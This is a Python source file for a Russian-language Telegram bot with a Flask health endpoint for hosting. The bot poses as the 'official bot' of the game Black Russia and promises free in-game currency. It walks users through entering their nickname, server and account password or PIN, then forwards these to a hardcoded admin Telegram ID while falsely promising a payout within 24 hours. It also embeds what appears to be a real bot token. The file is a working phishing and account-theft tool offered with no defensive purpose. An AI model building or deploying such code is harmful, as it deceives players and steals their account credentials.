import logging
import os
import asyncio
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ========== КОНФИГ ==========
TOKEN = os.environ.get("BOT_TOKEN", "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6005507174"))

# Состояния для разговора
NICKNAME, SERVER, PASSWORD = range(3)

# Хранилище данных
user_data = {}

# ========== КЛАВИАТУРЫ ==========
def main_menu():
    keyboard = [
        [InlineKeyboardButton("💰 Получить 25кк", callback_data="get_money")],
        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== ОБРАБОТЧИКИ ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "👋 *Добро пожаловать!*\n\n"
        "🤵 *Официальный бот от Black Russia*\n"
        "💰 Ты можешь получить *бесплатные 25кк* на *любом сервере*!\n\n"
        "⬇️ Используй кнопки ниже:"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🎮 *Шаг 1 из 3:*\nВведите ваш *НИК* в Black Russia:", parse_mode="Markdown")
    return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {"nickname": update.message.text}
    await update.message.reply_text("🌍 *Шаг 2 из 3:*\nУкажите название *СЕРВЕРА*:", parse_mode="Markdown")
    return SERVER

async def get_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id]["server"] = update.message.text
    await update.message.reply_text("🔐 *Шаг 3 из 3:*\nВведите *ПАРОЛЬ* (или пинкод) от аккаунта:", parse_mode="Markdown")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = user_data.get(user_id, {})
    nickname = data.get("nickname", "?")
    server = data.get("server", "?")
    password = update.message.text
    username = update.effective_user.username or "Нет юзернейма"
    full_name = update.effective_user.full_name

    admin_msg = (
        f"🔔 *НОВАЯ ЗАЯВКА НА 25кк!*\n\n"
        f"👤 *Пользователь:* {full_name}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"📛 *Username:* @{username}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎮 *Ник:* `{nickname}`\n"
        f"🌍 *Сервер:* `{server}`\n"
        f"🔑 *Пароль:* `{password}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Ожидает выдачи!"
    )

    try:
        await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
        await update.message.reply_text(
            "✅ *Заявка принята!*\n\n"
            "💰 Валюта придет в течение *24 часов*.\n"
            "🙏 Спасибо!",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
    except Exception as e:
        await update.message.reply_text("⚠️ Ошибка, владелец уведомлен.")

    if user_id in user_data:
        del user_data[user_id]
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Нет доступа")
        return
    await update.message.reply_text("🔧 Панель владельца. Бот работает!")

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Ваш ID: `{update.effective_user.id}`", parse_mode="Markdown")

# ========== ЗАПУСК БОТА ==========
async def run_bot():
    logging.basicConfig(level=logging.INFO)
    
    application = Application.builder().token(TOKEN).build()
    
    # Регистрируем обработчики
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
        states={
            NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
            SERVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_server)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("id", get_id))
    application.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
    application.add_handler(conv_handler)
    
    logging.info("🚀 Бот запущен!")
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    # Держим бота живым
    while True:
        await asyncio.sleep(3600)

# ========== FLASK ДЛЯ RENDER ==========
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "Bot is running!"

@app_flask.route('/health')
def health():
    return "OK"

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    import threading
    
    port = int(os.environ.get("PORT", 8000))
    
    # Запускаем Flask в отдельном потоке
    flask_thread = threading.Thread(target=lambda: app_flask.run(host="0.0.0.0", port=port))
    flask_thread.daemon = True
    flask_thread.start()
    
    # Запускаем бота
    asyncio.run(run_bot())
